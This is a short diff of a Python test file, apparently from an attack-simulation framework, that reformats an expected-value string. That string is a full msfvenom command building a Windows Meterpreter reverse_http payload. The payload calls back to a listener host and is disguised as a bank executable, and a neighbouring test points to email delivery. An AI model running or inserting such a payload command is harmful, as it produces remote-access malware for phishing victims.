@@ -33,7 +33,9 @@ def attack():
 class TestEmailEXEAttack:
     def test_generate_exe_command(self, attack: EmailEXEAttack):
         exe_command = attack._generate_exe_command()
-        expected_exe_command = f"msfvenom -p windows/x64/meterpreter/reverse_http LHOST=172.18.0.3 LPORT=80 -a x64 StagerRetryCount=604800 -f exe-only -o /root/Bank-of-Nuthington.exe"
+        expected_exe_command = ("msfvenom -p windows/x64/meterpreter/reverse_http "
+                                "LHOST=172.18.0.3 LPORT=80 -a x64 StagerRetryCount=604800 "
+                                "-f exe-only -o /root/Bank-of-Nuthington.exe")
         assert exe_command == expected_exe_command
 
     def test_sendemail_command(self, attack: EmailEXEAttack):
